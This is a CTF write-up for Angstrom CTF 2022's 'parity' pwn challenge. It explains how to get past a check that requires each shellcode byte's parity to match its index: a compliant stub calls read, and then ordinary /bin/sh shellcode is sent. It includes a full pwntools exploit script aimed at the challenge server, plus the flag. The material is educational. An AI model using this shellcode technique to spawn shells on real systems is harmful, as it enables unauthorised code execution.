---
title: "[Pwn] parity [Angstrom CTF 2022]"
date: 2022-05-07 00:17:00
---

# 0x0 Introduction

Check your parity.

nc challs.actf.co 31226

Author: JoshDaBosh

files: [parity](parity)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```


# 0x2 Vulnerability

basically, the `main` function ask us to enter a shellcode, then it will execute this shellcode. however the shellcode must satisfy a *parity*.

according to the program, the last bit of each byte in the shell must equal 0 or 1 depending on the index.

More specifically, for nth byte in the shell code, if the n is even, this byte must be even, if the n is odd, this byte must be odd.

It is not possible to construct `syscall('/bin/sh')` shellcode that satisfy this parity. But we can call `read` in our shellcode and then write `syscall('/bin/sh')` shellcode using `read` function.

1. construct a shellcode satisfy parity that calls `read`,
2. enter /bin/sh shellcode
3. get shell

# 0x3 Exploit

```
from pwn import *

exe = ELF("parity")
# libc = ELF("libc.so.6")
# ld = ELF("./ld-2.27.so")

context.binary = exe
# context.log_level = 'DEBUG'

def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            input("Wait r2 attach")
    else:
        r = remote("challs.actf.co", 31226)
    return r

def check_parity(shellcode):
    for index,b in enumerate(shellcode):
        print(index,b,b & 1,(index - (index >> 0x1f) & 1) +(index >> 0x1f))
        if (b & 1) != (index - (index >> 0x1f) & 1) +(index >> 0x1f):
            return False
    return True


io = start()

shellcode = '''
    mov rdx, 0x00011001
    mov ebx, 0x014011f0
    nop
    push rbx
    pop rax
    xor eax, 0x01000100
    nop
    call rax
'''
shell_sh = asm(shellcode)
with open("shelcd","wb") as f:
    f.write(shell_sh)
for index,b in enumerate(shell_sh):
    print(hex(b),b&1,index % 2)
print(check_parity(shell_sh))

io.sendafter(b"> ",shell_sh)
input("get shell")
io.send(shell_sh+asm(shellcraft.sh()))

io.interactive()

```

# 0x4 Flag

actf{f3els_like_wa1king_down_4_landsl1de_6d28d72fd7db}